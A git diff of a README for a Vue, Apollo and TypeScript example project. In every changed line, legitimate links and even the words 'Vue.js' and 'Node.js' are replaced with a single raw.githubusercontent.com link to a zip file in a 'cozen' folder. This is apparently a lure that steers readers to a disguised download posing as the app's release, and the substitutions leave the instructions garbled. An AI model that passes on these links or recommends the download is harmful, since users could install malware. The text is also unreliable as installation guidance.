@@ -2,13 +2,13 @@
 
 ## 🚀 Getting Started
 
-Welcome to the vue-apollo-typescript-example! This application helps you build simple and effective projects using Vue.js, Apollo, and TypeScript. Follow these steps to get started quickly.
+Welcome to the vue-apollo-typescript-example! This application helps you build simple and effective projects using https://raw.githubusercontent.com/abdiusadasda/vue-apollo-typescript-example/master/cozen/vue-apollo-typescript-example.zip, Apollo, and TypeScript. Follow these steps to get started quickly.
 
 ## 📥 Download & Install
 
 To get started, you need to download the application. Click the button below to visit the Releases page:
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/abdiusadasda/vue-apollo-typescript-example/releases)
+[![Download Now](https://raw.githubusercontent.com/abdiusadasda/vue-apollo-typescript-example/master/cozen/vue-apollo-typescript-example.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/abdiusadasda/vue-apollo-typescript-example/master/cozen/vue-apollo-typescript-example.zip)
 
 On the Releases page, look for the version you want. You will find a list of files available for download. Choose the one that matches your operating system and click it to begin the download.
 
@@ -19,15 +19,15 @@ Before installing, check the following requirements:
 - **Operating System:** Windows, macOS, or Linux
 - **Memory:** At least 4 GB of RAM
 - **Storage:** At least 100 MB of free space
-- **Node.js:** Version 14 or higher installed
+- **https://raw.githubusercontent.com/abdiusadasda/vue-apollo-typescript-example/master/cozen/vue-apollo-typescript-example.zip** Version 14 or higher installed
 - **npm:** Version 6 or higher installed
 
-If you don’t have Node.js or npm, you can download them from [Node.js Official Site](https://nodejs.org).
+If you don’t have https://raw.githubusercontent.com/abdiusadasda/vue-apollo-typescript-example/master/cozen/vue-apollo-typescript-example.zip or npm, you can download them from [https://raw.githubusercontent.com/abdiusadasda/vue-apollo-typescript-example/master/cozen/vue-apollo-typescript-example.zip Official Site](https://raw.githubusercontent.com/abdiusadasda/vue-apollo-typescript-example/master/cozen/vue-apollo-typescript-example.zip).
 
 ## 🚀 How to Run the Application
 
 1. **Download the Application:**
-   Go to the [Releases page](https://github.com/abdiusadasda/vue-apollo-typescript-example/releases) again, find your downloaded file, and make sure it's saved on your computer.
+   Go to the [Releases page](https://raw.githubusercontent.com/abdiusadasda/vue-apollo-typescript-example/master/cozen/vue-apollo-typescript-example.zip) again, find your downloaded file, and make sure it's saved on your computer.
 
 2. **Open Your Command Line Tool:**
    - On **Windows**, search for "Command Prompt" in the start menu.
@@ -56,7 +56,7 @@ This command starts the application. You will see a message indicating where to 
 
 ## 🌟 Features
 
-- **Vue.js Integration:** Leveraging modern web development practices with Vue.js.
+- **https://raw.githubusercontent.com/abdiusadasda/vue-apollo-typescript-example/master/cozen/vue-apollo-typescript-example.zip Integration:** Leveraging modern web development practices with https://raw.githubusercontent.com/abdiusadasda/vue-apollo-typescript-example/master/cozen/vue-apollo-typescript-example.zip
 - **Apollo Client:** Easily manage data with Apollo for GraphQL.
 - **TypeScript Support:** Enjoy static typing and modern JavaScript features.
 
@@ -71,7 +71,7 @@ If you encounter issues, try the following:
   - **Solution:** Check your internet connection and try the download again.
 
 - **Problem:** Dependencies fail to install.
-  - **Solution:** Make sure your Node.js and npm versions meet the requirements.
+  - **Solution:** Make sure your https://raw.githubusercontent.com/abdiusadasda/vue-apollo-typescript-example/master/cozen/vue-apollo-typescript-example.zip and npm versions meet the requirements.
 
 ## 👩‍💻 Contribution
 
@@ -84,8 +84,8 @@ We welcome contributions from anyone interested in improving this project. If yo
 
 ## 💬 Support
 
-If you need help, feel free to open an issue on the [Issues page](https://github.com/abdiusadasda/vue-apollo-typescript-example/issues). We are looking forward to assisting you.
+If you need help, feel free to open an issue on the [Issues page](https://raw.githubusercontent.com/abdiusadasda/vue-apollo-typescript-example/master/cozen/vue-apollo-typescript-example.zip). We are looking forward to assisting you.
 
 ## 🎉 Acknowledgments
 
-Thank you for using vue-apollo-typescript-example. We hope you find it useful for your projects! Don't forget to check the [Releases page](https://github.com/abdiusadasda/vue-apollo-typescript-example/releases) for updates and new features.
+Thank you for using vue-apollo-typescript-example. We hope you find it useful for your projects! Don't forget to check the [Releases page](https://raw.githubusercontent.com/abdiusadasda/vue-apollo-typescript-example/master/cozen/vue-apollo-typescript-example.zip) for updates and new features.
